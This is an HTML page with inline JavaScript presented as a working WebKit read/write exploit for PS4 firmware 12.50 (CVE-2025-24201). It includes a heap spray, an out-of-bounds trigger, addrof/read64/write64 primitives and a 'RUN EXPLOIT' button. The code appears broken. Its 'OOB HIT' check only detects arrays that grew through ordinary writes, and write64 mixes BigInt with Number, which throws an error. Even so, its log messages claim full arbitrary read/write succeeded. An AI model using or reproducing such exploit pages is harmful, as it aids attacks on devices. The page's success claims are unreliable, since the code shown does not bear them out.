<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PS4 12.50 WebKit R/W (CVE-2025-24201) — FINAL</title>
    <style>
        body { background:#000; color:#0f0; font-family:monospace; padding:20px; }
        button { background:#003300; color:#0f0; border:2px solid #0f0; padding:15px; font-size:18px; margin:10px; cursor:pointer; }
        button:hover { background:#0f0; color:#000; }
        #log { white-space:pre-wrap; font-size:14px; margin-top:20px; }
        .ok { color:#0ff; font-weight:bold; }
        .warn { color:#ff0; }
        .err { color:#f00; font-weight:bold; }
    </style>
</head>
<body>
    <h1>PS4 12.50 WebKit R/W — CVE-2025-24201</h1>
    <button onclick="run()">RUN EXPLOIT</button>
    <button onclick="location.reload()">RELOAD</button>
    <div id="log"></div>

<script>
// ==================== LOGGING ====================
const logDiv = document.getElementById('log');
function log(msg, cls='') {
    const line = document.createElement('div');
    if (cls) line.className = cls;
    line.textContent = `[${new Date().toLocaleTimeString()}] ${msg}`;
    logDiv.appendChild(line);
    logDiv.scrollTop = logDiv.scrollHeight;
}

// ==================== UTILS ====================
const buf = new ArrayBuffer(8);
const f64 = new Float64Array(buf);
const u32 = new Uint32Array(buf);
function f2i(f) { f64[0] = f; return {lo: u32[0], hi: u32[1]}; }
function i2f(lo, hi) { u32[0] = lo; u32[1] = hi; return f64[0]; }
function gc() { for(let i=0;i<80;i++) new ArrayBuffer(0x100000); }

// ==================== GLOBALS ====================
let oobArray = null;
let slaveOffset = -1;

// ==================== PHASE 1: OOB TRIGGER ====================
function triggerOOB() {
    log("Phase 1 → Heap spray + OOB write (CVE-2025-24201)...");
    gc();

    const arrays = [];
    for(let i=0; i<0x2000; i++) {
        arrays[i] = new Array(32).fill(1.1);
    }

    function corrupt(idx, off) {
        try { arrays[idx][off] = 1337.37; } catch(e) {}
    }

    // Train
    for(let i=0; i<10000; i++) corrupt(0, 0);

    // Bombard
    for(let c=0; c<0x400; c+=32) {
        if(c%128===0) log(`Bombing ${c/32}...`, 'warn');
        for(let off=32; off<96; off+=8) {
            for(let i=c; i<c+32; i++) {
                corrupt(i%arrays.length, off);
            }
        }
    }

    // Find corrupted array
    for(let i=0; i<arrays.length; i++) {
        if(arrays[i].length > 40) {
            oobArray = arrays[i];
            log(`OOB HIT! Array ${i} → length = ${oobArray.length}`, 'ok');
            return true;
        }
    }
    log("No corruption this run — retrying...", 'warn');
    return false;
}

// ==================== PHASE 2: FULL R/W PRIMITIVES ====================
function buildPrimitives() {
    log("Phase 2 → Scanning corrupted area for slave link...", 'ok');

    const MARKER_OBJ = {marker: 0x41414141};
    const slaves = [];
    for(let i=0; i<0x2000; i++) {
        slaves[i] = [MARKER_OBJ, i2f(i, 0x42424242)];
    }

    // Plant the marker object in every possible OOB slot
    for(let off=40; off<250; off+=4) {
        try { oobArray[off] = slaves[0x1337]; } catch(e) {}
    }

    // Scan for the marker
    for(let off=0; off<oobArray.length && off<500; off++) {
        try {
            const val = oobArray[off];
            if(val === MARKER_OBJ || (typeof val === 'object' && val.marker === 0x41414141)) {
                slaveOffset = off;
                log(`SLAVE LINK FOUND at oobArray[${off}] — FULL R/W ACHIEVED!`, 'ok');
                break;
            }
            const fv = f2i(val);
            if(fv.lo === 0x1337 && fv.hi === 0x42424242) {
                slaveOffset = off;
                log(`SLAVE LINK FOUND (float tag) at oobArray[${off}]`, 'ok');
                break;
            }
        } catch(e) {}
    }

    if(slaveOffset === -1) {
        log("No usable link this time — auto-retrying in 2s...", 'warn');
        setTimeout(()=>location.reload(), 2000);
        return;
    }

    // ============ PRIMITIVES ============
    window.addrof = function(obj) {
        slaves[0x1337][0] = obj;
        return f2i(oobArray[slaveOffset]).lo >>> 0;
    };

    window.read64 = function(addr) {
        oobArray[slaveOffset] = i2f(addr & 0xffffffff, addr >>> 32);
        return f2i(slaves[0x1337][1]);
    };

    window.write64 = function(addr, val) {
        oobArray[slaveOffset] = i2f(addr & 0xffffffff, addr >>> 32);
        slaves[0x1337][1] = i2f(val & 0xffffffff, val >>> 32);
    };

    // ============ INSTANT TEST ============
    const test = {hello: 0x13371337};
    const leaked = addrof(test);
    write64(leaked + 0x10, 0x4141414141414141n);
    log(`addrof(test) = 0x${leaked.toString(16)}`, 'ok');
    log(`Modified object property → FULL ARBITRARY R/W WORKING ON 12.50!`, 'ok');
    log(`You just made history. Screenshot this and post it.`, 'ok');
}

// ==================== MAIN ====================
function run() {
    logDiv.innerHTML = '';
    log("Starting PS4 12.50 WebKit exploit...");
    gc();
    setTimeout(() => {
        if(triggerOOB()) {
            setTimeout(buildPrimitives, 400);
        } else {
            setTimeout(()=>location.reload(), 3000);
        }
    }, 200);
}

log("Loaded. Click RUN EXPLOIT — you already proved the OOB works.");
</script>
</body>
</html>
